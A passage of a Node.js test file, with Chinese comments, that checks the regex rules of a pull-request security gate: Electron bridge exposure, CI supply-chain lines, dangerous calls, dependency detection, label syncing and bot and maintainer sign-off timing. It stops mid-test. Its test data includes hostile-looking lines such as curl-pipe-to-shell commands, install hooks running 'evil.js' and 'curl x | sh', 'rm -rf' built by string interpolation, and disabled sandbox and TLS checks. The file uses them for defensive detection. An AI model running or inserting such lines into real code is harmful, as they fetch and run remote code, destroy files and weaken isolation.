#!/usr/bin/env node
// security-patterns.test.mjs — 安全敏感改动门(SKILL 3.4)判定正则的单测
//
// 为什么必须有这份测试:本门的结论直接决定「能不能合并」。正则一旦被改松(或被后续改动
// 意外改坏),失效是**静默**的 —— 门照样输出 trigger=null,汇总照样写「无安全问题」,
// 没有任何报错提示你它已经不拦了。这与冷更门的 parseFingerprintGuard 同理(见 lib.mjs
// 那段注释),所以判定正则都放在 lib.mjs 由本文件覆盖。
//
// 两个方向都要守:
//   ① 真风险必须抓住(漏 = 0day 进默认分支);
//   ② 正常写法不能误伤(误报 = 每个 PR 都要等人确认,最后门被当噪音关掉,等于没有门)。
// 用例来自实测:preload 相关 4 条不应触发的用例,就是 PR #697/#669/#682/#679 的真实改动形态
// (#697 只改了一行 JSDoc,旧口径下被拦)。
//
// 跑:node <skill-root>/scripts/security-patterns.test.mjs
// 退出码 0 = 全过;非 0 = 有失败(改完正则请务必跑一次)。

import {
  RISKY_HARD_BASE_PATTERNS,
  RISKY_SOFT_BASE_PATTERNS,
  REMOVED_GUARD_RE,
  COMMENT_ONLY_RE,
  BOUNDARY_FEATURES,
  matchNewDependency,
  scanBoundaryLine,
  syncSignoffLabel,
  removeLegacyGateLabels,
  isCredPermissionError,
  credFallbackPlan,
  evaluateBotSettle,
  evaluateMaintainerReview,
  parseSignoffReleaseEvents,
  parseSignoffReleases,
  selectTrustedSignoffReleases,
  parseLastHoldMarker,
  parseSignoffRenotices,
  SIGNOFF_RENOTICE_MARKER_PREFIX,
} from './lib.mjs';

let failed = 0;
let passed = 0;
const check = (ok, label) => {
  if (ok) passed += 1;
  else failed += 1;
  console.log(`${ok ? '  PASS' : '  FAIL'} | ${label}`);
};
const section = (t) => console.log(`\n=== ${t} ===`);

const hardKinds = (line) => RISKY_HARD_BASE_PATTERNS.filter(([, re]) => re.test(line)).map(([k]) => k);
const softKinds = (line) => RISKY_SOFT_BASE_PATTERNS.filter(([, re]) => re.test(line)).map(([k]) => k);
/** 单行是否构成「动了安全边界内容」(路径触发的第二条件)。走 scanBoundaryLine 真实现。 */
const touchesBoundary = (file, line) => {
  const sink = new Set();
  scanBoundaryLine(line, file, sink);
  return sink.has(file);
};

const PRELOAD = 'apps/desktop/src/preload/preload.ts';
const WORKFLOW = '.github/workflows/ci.yml';
const UPDATER = 'apps/desktop/cindy-updater/src-tauri/src/main.rs';

section('边界特征:preload 桥接边界');
for (const [name, line, expect] of [
  ['变量 channel 转发(可调任意 handler = 真逃逸)', '  invoke: (ch, ...a) => ipcRenderer.invoke(ch, ...a),', true],
  ['改 contextBridge 暴露', "contextBridge.exposeInMainWorld('cindy', api)", true],
  ['把 require 当值递出去(最彻底的逃逸)', '  nodeRequire: require,', true],
  ['require(变量)', '  load: (m) => require(m),', true],
  ['暴露 process.platform', '  plat: process.platform,', true],
  ['引入 electron(preload 常规写法,但仍是桥接面)', "const { contextBridge } = require('electron');", true],
  // 以下四条是实测里被旧口径误拦的真实改动形态
  ['字面量 channel 的新增通道(#669)', "  move: (id) => ipcRenderer.invoke('local-db:sessions:move', id),", false],
  ['只改一行 JSDoc 注释(#697)', '  /** 登录页协议门放行时调用一次;幂等。 */', false],
  ['读 NODE_ENV', "  const dev = process.env.NODE_ENV === 'development';", false],
  ['空行', '', false],
]) check(touchesBoundary(PRELOAD, line) === expect, `${expect ? '应触发   ' : '不应触发 '}${name}`);

section('边界特征:CI 供应链');
for (const [name, line, expect] of [
  ['pull_request_target(跑 fork 代码还拿 secrets)', '  pull_request_target:', true],
  ['改 permissions', 'permissions:', true],
  ['用 secrets', '      token: ${{ secrets.GITHUB_TOKEN }}', true],
  ['引用移动版本 action(上游可随时换代码)', '      - uses: some/action@main', true],
  ['curl 管道执行', '        run: curl -sL https://x.sh | bash', true],
  ['base64 解码执行', '        run: echo $P | base64 -d > /tmp/x', true],
  ['github.event 直插 run(脚本注入)', '        run: echo ${{ github.event.pull_request.title }}', true],
  ['固定版本 action(推荐写法)', '      - uses: actions/checkout@v4', false],
  ['普通 run', '        run: pnpm test', false],
  ['yaml 注释', '  # permissions: 说明', false],
]) check(touchesBoundary(WORKFLOW, line) === expect, `${expect ? '应触发   ' : '不应触发 '}${name}`);

section('边界特征:无专门特征表的路径(updater)按实质改动判');
for (const [name, line, expect] of [
  ['任何实质代码行', '    let url = args.update_url;', true],
  ['注释行', '    // 检查更新签名', false],
]) check(touchesBoundary(UPDATER, line) === expect, `${expect ? '应触发   ' : '不应触发 '}${name}`);

section('危险写法硬命中(命中即硬拦)');
for (const [name, line, kind] of [
  ['nodeIntegration 打开', 'webPreferences: { nodeIntegration: true }', 'electron-isolation-off'],
  ['contextIsolation 关闭', '    contextIsolation: false,', 'electron-isolation-off'],
  ['webSecurity 关闭', '  webSecurity: false,', 'electron-isolation-off'],
  ['sandbox 关闭', '  sandbox: false,', 'electron-isolation-off'],
  ['--no-sandbox 开关', "app.commandLine.appendSwitch('--no-sandbox')", 'electron-isolation-off'],
  ['eval', 'const r = eval(userInput);', 'dynamic-eval'],
  ['new Function', 'const f = new Function("return " + s);', 'dynamic-eval'],
  ['vm.runInNewContext', 'vm.runInNewContext(code, ctx)', 'dynamic-eval'],
  ['拼字符串 exec(命令注入)', 'execSync(`rm -rf ${dir}`)', 'shell-string-exec'],
  ['字符串相加 exec', 'exec("git checkout " + branch)', 'shell-string-exec'],
  ['execFile 拼接', 'execFileSync(`${bin}`, args)', 'shell-string-exec'],
  ['shell:true', 'spawn(cmd, args, { shell: true })', 'shell-string-exec'],
  // obj.exec 靠**参数里的 shell 特征**判,不靠调用形态(形态与正则 exec 完全相同)
  ['远程 exec 带 bash -c(#715 真命中)', 'await host.exec(`bash -c \'rm -f "${p}"\'`, {})', 'shell-cmd-exec'],
  ['obj.exec 带 sh -c', 'await conn.exec(`sh -c ${q}`)', 'shell-cmd-exec'],
  ['obj.exec 带 && 串命令', 'runner.exec(`cd ${d} && make`)', 'shell-cmd-exec'],
  ['CSP unsafe-inline', `'Content-Security-Policy': "script-src 'unsafe-inline'"`, 'csp-relax'],
  ['CSP unsafe-eval', "csp: \"script-src 'unsafe-eval'\"", 'csp-relax'],
  ['shell.openExternal', '  open: (url) => shell.openExternal(url),', 'navigation-escape'],
  ['setWindowOpenHandler', 'win.webContents.setWindowOpenHandler(() => ({ action: "allow" }))', 'navigation-escape'],
  ['关掉证书校验', '  rejectUnauthorized: false,', 'permission-bypass'],
  ['NODE_TLS_REJECT_UNAUTHORIZED', "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';", 'permission-bypass'],
  ['权限请求处理器', 'session.setPermissionRequestHandler((wc, p, cb) => cb(true))', 'permission-bypass'],
  ['postinstall 钩子(供应链载荷位)', '    "postinstall": "node evil.js",', 'install-hook'],
  ['preinstall 钩子', '    "preinstall": "curl x | sh",', 'install-hook'],
]) check(hardKinds(line).includes(kind), `${name} -> ${JSON.stringify(hardKinds(line))}`);

section('安全写法不应硬命中(误报会让门被当噪音关掉)');
for (const [name, line] of [
  ['spawn 数组参数(安全写法)', 'spawn("git", ["status", branch])'],
  ['固定命令 exec 无拼接', 'execSync("pnpm build")'],
  ['正常 import', 'import { readFile } from "node:fs/promises";'],
  ['正常赋值', 'const timeout = 30_000;'],
  ['字面量 require', "const path = require('node:path');"],
  ['contextIsolation 打开(正确配置)', '  contextIsolation: true,'],
  ['sandbox 打开(正确配置)', '  sandbox: true,'],
  ['动态 import(现代常用)', 'const m = await import(specifier);'],
  // 以下两条是实测误报回归:RegExp.prototype.exec 与 child_process.exec 形态相同
  ['正则 exec 带模板串(#526 误报)', 'const m = raw!.exec(`\\n${body}\\n`);'],
  ['正则 exec 变量参数', 'const m = re.exec(line + suffix);'],
  ['正则 exec 字面量', 'const m = /ab+c/.exec(str);'],
]) check(hardKinds(line).length === 0, `${name} -> ${JSON.stringify(hardKinds(line))}`);

section('软命中(不拦,交审查 agent 定性)');
for (const [name, line, kind] of [
  ['外发请求到外部域名', "await fetch('https://api.example.com/collect', { body })", 'net-egress'],
  ['写文件', 'await writeFile(target, data)', 'fs-write'],
  ['读敏感环境变量', 'const t = process.env.GITHUB_TOKEN;', 'env-secret-read'],
  ['引入子进程', "import { spawn } from 'node:child_process';", 'child-process-import'],
  ['innerHTML', 'el.innerHTML = html;', 'dangerous-html'],
  ['md5', "createHash('md5').update(x)", 'weak-crypto'],
  // 歧义形态降级到软命中:多半是正则 exec,少数是包了一层的命令执行,交审查 agent 定性
  ['obj.exec 带拼接但无 shell 特征', 'const m = raw!.exec(`${body}`);', 'obj-exec-interpolated'],
]) check(softKinds(line).includes(kind), `${name} -> ${JSON.stringify(softKinds(line))}`);
for (const [name, line] of [
  ['本地回环请求不算外发', "await fetch('http://127.0.0.1:3000/ping')"],
  ['localhost 不算外发', "await fetch('http://localhost:8080/x')"],
  ['普通 env 不算敏感', 'const p = process.env.PORT;'],
]) check(softKinds(line).length === 0, `不应软命中 ${name} -> ${JSON.stringify(softKinds(line))}`);

section('安全保护被移除(只在删除行上判)');
// 与 context.mjs 的 scanRemovedGuardLine 同一组判据:先滤纯注释,再看安全标识
const removedGuard = (line) => !COMMENT_ONLY_RE.test(line) && REMOVED_GUARD_RE.test(line);
for (const [name, line, expect] of [
  ['删掉 CSP 设置', '    "Content-Security-Policy": csp,', true],
  ['删掉 sender 校验', '  if (!validateSender(e)) return;', true],
  ['删掉 contextIsolation 配置', '    contextIsolation: true,', true],
  ['删掉权限处理器', '  session.setPermissionRequestHandler(deny)', true],
  ['删掉证书校验函数', '  session.setCertificateVerifyProc(verify)', true],
  ['删掉普通代码', '  const x = 1;', false],
  // 实测误报回归:删掉一句提到 sandbox 的注释不是移除保护
  ['删掉提到 sandbox 的注释(#670 误报)', '  // thread/start 的 sandbox: SandboxMode,写错会被忽略。', false],
  ['删掉提到 CSP 的注释', '  // 这里设置 Content-Security-Policy', false],
  ['删掉块注释里的 contextIsolation', '   * contextIsolation: 必须开启', false],
]) check(removedGuard(line) === expect, `${expect ? '应命中   ' : '不应命中 '}${name}`);

section('新增第三方依赖识别(供应链入口)');
for (const [name, line, expect] of [
  ['caret 版本', '    "silk-wasm": "^0.1.2",', 'silk-wasm'],
  ['scoped 包', '    "@types/node": "^20.0.0",', '@types/node'],
  ['固定版本', '    "lodash": "4.17.21",', 'lodash'],
  ['tilde 版本', '    "zod": "~3.22.0",', 'zod'],
  ['通配版本', '    "foo": "*",', 'foo'],
  ['git 依赖(绕过 registry)', '    "evil": "git+https://x/y.git",', 'evil'],
  ['npm 别名', '    "alias": "npm:real-pkg@1.0.0",', 'alias'],
  ['version 字段不是依赖', '  "version": "1.2.3",', null],
  ['name 字段不是依赖', '  "name": "my-pkg",', null],
  ['scripts 命令不是依赖', '    "build": "tsc -b",', null],
  ['engines node 不是依赖', '    "node": ">=18",', null],
  ['packageManager 不是依赖', '  "packageManager": "pnpm@9.0.0",', null],
  ['workspace 内部包不是第三方', '    "@cindy/core": "workspace:*",', null],
  ['catalog 引用不是第三方', '    "react": "catalog:",', null],
  ['file 引用不是第三方', '    "local": "file:../local",', null],
  ['link 引用不是第三方', '    "linked": "link:../linked",', null],
]) check(matchNewDependency(line) === expect, `${name} -> ${matchNewDependency(line)}`);

section('注释判据');
for (const [name, line, expect] of [
  ['行注释', '  // x', true],
  ['块注释开头', '  /* x', true],
  ['块注释中间', '   * x', true],
  ['yaml 注释', '# x', true],
  ['html 注释', '<!-- x -->', true],
  ['空行', '   ', true],
  ['实质代码', '  const x = 1;', false],
]) check(COMMENT_ONLY_RE.test(line) === expect, `${expect ? '算注释   ' : '不算注释 '}${name}`);

section('维护者确认标签同步(单一新标签,幂等,只动本流程管理的 label)');
{
  const calls = [];
  const fakeGh = (args) => { calls.push(args.join(' ')); return { ok: true, stdout: '', stderr: '' }; };
  // 该挂没挂 → 创建 + 加标
  const r = syncSignoffLabel({ owner: 'o', repo: 'r', pr: 1, want: true, current: ['bug'], ghFn: fakeGh });
  check(JSON.stringify(r.added) === '["awaiting-discussion"]', `挂维护者确认标签 -> ${JSON.stringify(r.added)}`);
  check(calls.some((c) => c.startsWith('label create awaiting-discussion')), '标签不存在时先创建');
  check(!calls.some((c) => /bug/.test(c)), '绝不碰仓库其它 label');
}
{
  const calls = [];
  const fakeGh = (args) => { calls.push(args.join(' ')); return { ok: true, stdout: '', stderr: '' }; };
  // 该摘没摘 → 摘掉
  const r = syncSignoffLabel({ owner: 'o', repo: 'r', pr: 1, want: false, current: ['awaiting-discussion', 'enhancement'], ghFn: fakeGh });
  check(JSON.stringify(r.removed) === '["awaiting-discussion"]', `摘维护者确认标签 -> ${JSON.stringify(r.removed)}`);
  check(!calls.some((c) => /enhancement/.test(c)), '摘标也不碰其它 label');
}
{
  const fakeGh = () => { throw new Error('不应被调用'); };
  // 幂等:状态一致时零请求
  check(syncSignoffLabel({ owner: 'o', repo: 'r', pr: 1, want: true, current: ['awaiting-discussion'], ghFn: fakeGh }).changed === false, '已挂着时零请求(幂等)');
  check(syncSignoffLabel({ owner: 'o', repo: 'r', pr: 1, want: false, current: [], ghFn: fakeGh }).changed === false, '本就没挂时零请求(幂等)');
}
{
  // label 已存在:gh label create 报 already exists 不算错
  const fakeGh = (args) => (args[0] === 'label'
    ? { ok: false, stdout: '', stderr: 'a label with this name already exists' }
    : { ok: true, stdout: '', stderr: '' });
  const r = syncSignoffLabel({ owner: 'o', repo: 'r', pr: 1, want: true, current: [], ghFn: fakeGh });
  check(r.errors.length === 0 && r.added.length === 1, `label 已存在不算错误 -> ${JSON.stringify(r.errors)}`);
}

section('维护者确认标签走 REST issue-label 端点');
{
  const calls = [];
  const fakeGh = (args) => { calls.push(args.join(' ')); return { ok: true, stdout: '', stderr: '' }; };
  syncSignoffLabel({ owner: 'o', repo: 'r', pr: 7, want: true, current: [], ghFn: fakeGh });
  check(calls.some((c) => c === 'api -X POST repos/o/r/issues/7/labels -f labels[]=awaiting-discussion'), `挂标签走 REST POST -> ${calls.join(' | ')}`);
  check(!calls.some((c) => /pr edit/.test(c)), '绝不回退到 gh pr edit(它会顺带预查 reviewRequests.requestedReviewer,被 PAT 拒时整条陪葬)');
}
{
  const calls = [];
  const fakeGh = (args) => { calls.push(args.join(' ')); return { ok: true, stdout: '', stderr: '' }; };
  syncSignoffLabel({ owner: 'o', repo: 'r', pr: 7, want: false, current: ['awaiting-discussion'], ghFn: fakeGh });
  check(calls.length === 1 && calls[0] === 'api -X DELETE repos/o/r/issues/7/labels/awaiting-discussion', `摘标签走 REST DELETE -> ${calls.join(' | ')}`);
}
{
  // 摘标签时 404 = 本来就没挂:幂等成功,不该报错
  const fakeGh = () => ({ ok: false, stdout: '{"status": "404"}', stderr: 'gh: Not Found (HTTP 404)' });
  const r = syncSignoffLabel({ owner: 'o', repo: 'r', pr: 7, want: false, current: ['awaiting-discussion'], ghFn: fakeGh });
  check(r.errors.length === 0 && r.changed === true, `DELETE 404 视为已摘掉 -> ${JSON.stringify(r)}`);
}
{
  // 写权限真被拒:必须报错 + 顶层 warning,且原文照抄(不替 GitHub 下「无权限」结论)
  const RAW = 'gh: Resource not accessible by personal access token (HTTP 403)';
  const fakeGh = (args) => (args[0] === 'label' ? { ok: true, stdout: '', stderr: '' } : { ok: false, stdout: '', stderr: RAW });
  const r = syncSignoffLabel({ owner: 'o', repo: 'r', pr: 7, want: true, current: [], ghFn: fakeGh });
  check(r.changed === false && r.added.length === 0, '贴失败不谎报 added');
  check(r.errors[0]?.includes(RAW), `errors 照抄原始报错 -> ${r.errors[0]}`);
  check(typeof r.warning === 'string' && r.warning.includes(RAW), `warning 顶层可见且带原文 -> ${r.warning}`);
  check(r.warning.startsWith('维护者确认标签'), `warning 使用维护者确认用词 -> ${r.warning}`);
}
{
  const calls = [];
  // 旧主标签与旧门类子标签都要迁走;标签名进 URL 路径前要转义
  const fakeGh = (args) => {
    calls.push(args.join(' '));
    return args.join(' ').includes('need-whitelist%3Aarch')
      ? { ok: false, stdout: '', stderr: 'boom' }
      : { ok: true, stdout: '', stderr: '' };
  };
  const r = removeLegacyGateLabels({ owner: 'o', repo: 'r', pr: 7, current: ['awaiting-maintainer-discussion', 'needs-maintainer-approval', 'need-whitelist', 'need-whitelist:product', 'need-whitelist:arch', 'bug'], ghFn: fakeGh });
  check(calls.some((c) => /awaiting-maintainer-discussion/.test(c)), '更名之前的讨论标签也会被清理');
  check(calls.some((c) => /needs-maintainer-approval/.test(c)), '上一版确认标签也会被清理');
  check(calls.every((c) => !/:(?:product|arch)/.test(c)), `旧子标签名进路径前已转义 -> ${calls.join(' | ')}`);
  check(JSON.stringify(r.legacyRemoved) === '["awaiting-maintainer-discussion","needs-maintainer-approval","need-whitelist","need-whitelist:product"]', `历代主标签与旧子标签逐个摘、一个失败不连坐 -> ${JSON.stringify(r)}`);
  check(r.errors.length === 1 && r.errors[0].includes('need-whitelist:arch'), '失败的那个点名报错');
  check(!calls.some((c) => /bug/.test(c)), '不碰仓库其它 label');
  check(removeLegacyGateLabels({ owner: 'o', repo: 'r', pr: 7, current: ['bug'], ghFn: () => { throw new Error('不应被调用'); } }).legacyRemoved.length === 0, '没有旧标签时零请求');
}

section('凭证 fallback:GH_TOKEN 权限不足时换钥匙串凭证重试一次');
{
  const perm = { ok: false, stderr: 'gh: Resource not accessible by personal access token (HTTP 403)', stdout: '' };
  const permGraphql = { ok: false, stderr: '', stdout: '{"errors":[{"message":"Resource not accessible by personal access token"}]}' };
  const permIntegration = { ok: false, stderr: 'Resource not accessible by integration', stdout: '' };
  check(isCredPermissionError(perm), 'REST 403 文案算权限错');
  check(isCredPermissionError(permGraphql), 'GraphQL 的错在 stdout 里也认');
  check(isCredPermissionError(permIntegration), 'integration 变体也认');
  check(!isCredPermissionError({ ok: false, stderr: 'gh: Not Found (HTTP 404)', stdout: '' }), '404 不算权限错');
  check(!isCredPermissionError({ ok: true, stderr: '', stdout: '' }), '成功的调用不算权限错');

  const withToken = { GH_TOKEN: 'x' };
  check(credFallbackPlan({ result: perm, env: withToken }).retry === true, '权限错 + 环境变量里有 token → 重试');
  check(JSON.stringify(credFallbackPlan({ result: perm, env: { GITHUB_TOKEN: 'x', GH_TOKEN: 'y' } }).stripped) === '["GH_TOKEN","GITHUB_TOKEN"]', '两个 token 环境变量都摘');
  check(credFallbackPlan({ result: perm, env: {} }).retry === false, '环境变量里没 token = 已在用钥匙串凭证,不重试(避免白跑一次)');
  check(credFallbackPlan({ result: { ok: false, stderr: 'network unreachable' }, env: withToken }).retry === false, '非权限错不重试(写可能已生效,重试会重复写)');
  check(credFallbackPlan({ result: perm, env: { ...withToken, REVIEW_PR_NO_CRED_FALLBACK: '1' } }).retry === false, 'REVIEW_PR_NO_CRED_FALLBACK=1 可关掉');
  check(credFallbackPlan({ result: perm, env: withToken, disabled: true }).retry === false, 'noCredFallback 逐调用关掉');
}

section('机器人静默期(防合并跑在外部 review 机器人前面)');
{
  const BOTS = ['copilot-pull-request-reviewer', 'chatgpt-codex-connector'];
  const cfg = { reviewers: BOTS, maxWaitMinutes: 15 };
  const HEAD = '2026-07-27T21:15:51Z';
  const at = (min) => new Date(Date.parse(HEAD) + min * 60_000).toISOString();

  // 复刻 #716 实况:head 21:15:51,合并发生在 +3.2 分钟,那时两个机器人都还没表态
  let r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(3.2), activity: [], cfg });
  check(r.settled === false, `#716 复刻:合并时刻(+3.2 分钟)应拦住 -> settled=${r.settled}`);
  check(r.pending.length === 2, `两个机器人都还没表态 -> pending=${JSON.stringify(r.pending)}`);

  // +6.2 分钟 Copilot 表态,Codex 还没 → 仍拦
  const copilotSpoke = [{ author: 'copilot-pull-request-reviewer', at: at(6.2) }];
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(7), activity: copilotSpoke, cfg });
  check(r.settled === false && r.pending.includes('chatgpt-codex-connector'), '只有 Copilot 表态时仍拦住(等 Codex)');

  // +10.9 分钟 Codex 也表态 → 放行
  const bothSpoke = [...copilotSpoke, { author: 'chatgpt-codex-connector', at: at(10.9) }];
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(11), activity: bothSpoke, cfg });
  check(r.settled === true && r.timedOut === false, `两个都表态后放行 -> settled=${r.settled} timedOut=${r.timedOut}`);

  // 静默窗口(维护者 2026-07-30 定的节奏:三兄弟都说完 + 安静 5 分钟才进审查)
  const qcfg = { ...cfg, quietMinutes: 5, quietExtraBots: ['greptile-apps'] };
  // 都表态了,但最后一条 bot 动静距今只有 0.1 分钟 → 还没安静够,不放行
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(11), activity: bothSpoke, cfg: qcfg });
  check(r.settled === false && /静默/.test(r.reason), `都表态但静默未满 5 分钟不放行 -> ${r.reason.slice(0, 40)}`);
  // 最后动静在 +10.9,现在 +16 → 已安静 5.1 分钟 → 放行
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(16), activity: bothSpoke, cfg: qcfg });
  check(r.settled === true && r.timedOut === false, `静默满 5 分钟后放行 -> settled=${r.settled}`);
  // greptile(不必等、但在 quiet 名单)在 +12 又说了一句 → 静默计时被重置,+13.5 时不放行
  // (注意别把 now 推过 maxWait=15:总上限兜底会正确地超时放行,那是另一条用例)
  const withGreptile = [...bothSpoke, { author: 'greptile-apps[bot]', at: at(12) }];
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(13.5), activity: withGreptile, cfg: qcfg });
  check(r.settled === false, 'greptile 的新动静会重置静默计时(不必等它,但它说话要听完)');
  // 静默反复被重置也有总上限兜底:距 head push 超 maxWait 即放行
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(15.5), activity: [...bothSpoke, { author: 'greptile-apps', at: at(15.4) }], cfg: qcfg });
  check(r.settled === true && r.timedOut === true, `静默未满但总时长超上限按超时放行 -> timedOut=${r.timedOut}`);
  // 不配 quietMinutes(默认 0)→ 行为与旧口径一致,表态即放行
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(11), activity: bothSpoke, cfg });
  check(r.settled === true, 'quietMinutes 未配置时保持旧行为(表态即放行)');

  // 机器人挂掉:等到上限仍无人表态 → 超时放行,但标记 timedOut(不能永久卡死 PR)
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(15.1), activity: [], cfg });
  check(r.settled === true && r.timedOut === true, `超上限按超时放行 -> settled=${r.settled} timedOut=${r.timedOut}`);
  check(r.pending.length === 2, '超时放行时仍如实列出没表态的机器人(汇总要写)');

  // 旧发言不算:机器人只在 head 之前说过话 → 不算对当前 head 表态
  const staleOnly = BOTS.map((b) => ({ author: b, at: at(-5) }));
  r = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(3), activity: staleOnly, cfg });
  check(r.settled === false, 'head 之前的旧发言不算表态(避免拿上一轮的 review 蒙过去)');

  // [bot] 后缀归一
  r = evaluateBotSettle({
    headCommittedDate: HEAD, nowIso: at(3),
    activity: BOTS.map((b) => ({ author: `${b}[bot]`, at: at(2) })), cfg,
  });
  check(r.settled === true, 'author 带 [bot] 后缀时也能正确归一匹配');

  // 关掉开关 / 名单为空 → 不拦
  check(evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(1), activity: [], cfg: { ...cfg, enabled: false } }).settled === true, 'enabled:false 时不拦');
  check(evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(1), activity: [], cfg: { reviewers: [] } }).settled === true, 'reviewers 为空时不拦');

  // head 时间读不到 → 不拦(不把「查不到」变成永久阻断),但 reason 要说明未证明
  r = evaluateBotSettle({ headCommittedDate: '', nowIso: at(1), activity: [], cfg });
  check(r.settled === true && /读不到/.test(r.reason), `head 时间读不到时不拦但如实说明 -> ${r.reason.slice(0, 30)}`);

  // 默认上限 20 分钟(维护者 2026-07-28 定,覆盖 Copilot p99=19 与观测最慢 22.7 附近)。
  // 守这条是防「配置写 20、代码兜底还是 15」的漂移 —— 配置缺失时行为要与文档一致。
  const dflt = evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(1), activity: [], cfg: { reviewers: BOTS } });
  check(dflt.maxWaitMinutes === 20, `未配 maxWaitMinutes 时默认 20 -> ${dflt.maxWaitMinutes}`);
  check(evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(16), activity: [], cfg: { reviewers: BOTS } }).settled === false,
    '默认上限下 +16 分钟仍拦住(15 分钟口径会在此放行)');
  check(evaluateBotSettle({ headCommittedDate: HEAD, nowIso: at(20.1), activity: [], cfg: { reviewers: BOTS } }).timedOut === true,
    '默认上限下 +20.1 分钟按超时放行');
}

section('维护者确认门:当前 head 的 Approve / Request Changes');
{
  const maintainers = ['magiclizi', 'dashhuang'];
  const review = (login, state, at) => ({ login, state, at });
  let selfApproval = evaluateMaintainerReview({
    maintainers,
    authorLogin: 'magiclizi',
    reviews: [review('magiclizi', 'APPROVED', '2026-08-01T11:00:00Z')],
  });
  check(selfApproval.released === null, '作者自己的 Approve 即使出现在输入中也不构成独立确认');
  let r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T10:00:00Z',
    reviews: [review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T11:00:00Z')],
  });
  check(r.waitingForAuthor === true && r.released === null, '当前 head 被 Request Changes → 轮到作者,不再等维护者确认');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T12:00:00Z',
    reviews: [review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T11:00:00Z')],
  });
  check(r.waitingForAuthor === false && r.needsRecheck === true, '作者在 Request Changes 后新提交 → 重新等维护者确认');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T10:00:00Z',
    reviews: [review('dashhuang', 'APPROVED', '2026-08-01T11:00:00Z')],
  });
  check(r.released?.via === 'github-approve' && r.released?.by === 'dashhuang', '当前 head 的 Approve → 维护者确认完成');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T12:00:00Z',
    reviews: [review('dashhuang', 'APPROVED', '2026-08-01T11:00:00Z')],
  });
  check(r.released?.via === 'github-approve' && r.released?.by === 'dashhuang' && r.needsRecheck === false, 'Approve 后作者又提交 → 历史 Approve 持久放行,门不再重亮');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T10:00:00Z',
    reviews: [
      review('dashhuang', 'APPROVED', '2026-08-01T10:30:00Z'),
      review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T11:00:00Z'),
    ],
  });
  check(r.waitingForAuthor === true && r.released === null, '任一维护者仍要求修改 → 不因另一人的 Approve 误算完成');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T11:30:00Z',
    reviews: [
      review('magiclizi', 'APPROVED', '2026-08-01T10:30:00Z'),
      review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T12:00:00Z'),
    ],
  });
  check(r.waitingForAuthor === true && r.released === null,
    '同一维护者先 Approve 后对当前 head Request Changes → 当前修改要求仍优先,不提前放行');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T12:00:00Z',
    markerRelease: { by: 'magiclizi', at: '2026-08-01T11:00:00Z', via: 'release-marker' },
  });
  check(r.released?.via === 'release-marker' && r.released?.by === 'magiclizi', '旧手动通过标记也持久有效 → 同 Approve 放行新 head');

  // 新增:历史 Approve 持久放行场景
  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T13:00:00Z',  // 作者在 Request Changes 后推了修复
    reviews: [
      review('dashhuang', 'APPROVED', '2026-08-01T10:30:00Z'),          // 历史 Approve(早于当前 head)
      review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T12:00:00Z'), // Request Changes 已被新提交消费
    ],
  });
  check(r.waitingForAuthor === false && r.released?.via === 'github-approve' && r.released?.by === 'dashhuang',
    'Request Changes 被新提交消费后有历史 Approve → 门持久放行,不重新亮');

  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T13:00:00Z',
    reviews: [
      review('magiclizi', 'APPROVED', '2026-08-01T10:30:00Z'),
      review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T12:00:00Z'),
    ],
  });
  check(r.waitingForAuthor === false && r.released?.via === 'github-approve' && r.released?.by === 'magiclizi',
    '同一维护者先 Approve 后 Request Changes,作者提交修复 → 历史 Approve 持久放行,不重新亮门');

  // 从未 Approve 过:Request Changes + 作者新提交 → 仍需重确认
  r = evaluateMaintainerReview({
    maintainers,
    latestCommitDate: '2026-08-01T13:00:00Z',
    reviews: [
      review('magiclizi', 'CHANGES_REQUESTED', '2026-08-01T11:00:00Z'),
    ],
  });
  check(r.waitingForAuthor === false && r.needsRecheck === true && r.released === null,
    '从未 Approve 过且 Request Changes 被消费 → 重新等维护者确认');

  r = evaluateMaintainerReview({
    maintainers,
    reviews: [
      review('dashhuang', 'APPROVED', '2026-08-01T10:00:00Z'),
      review('dashhuang', 'DISMISSED', '2026-08-01T10:00:00Z'),
    ],
  });
  check(r.released === null && r.needsRecheck === true,
    '同一 review 被 DISMISSED 后不复活更早 Approve');
}

section('维护者确认门通过:通过标记解析(按类别保留最后一次)');
{
  const at = (s, t) => ({ body: s, createdAt: t });
  // 两条标记取并集;同 kind 后写的覆盖(by/at 取最新)
  const m = parseSignoffReleases([
    at('放行说明 A\n\n<!-- review-pr:signoff-release gates=product by=dashhuang -->', '2026-07-28T01:00:00Z'),
    at('放行说明 B\n\n<!-- review-pr:signoff-release gates=security,rules by=magiclizi -->', '2026-07-28T02:00:00Z'),
  ]);
  check(m.has('product') && m.has('security') && m.has('rules'), `多条标记按 kind 取并集 -> ${JSON.stringify([...m.keys()])}`);
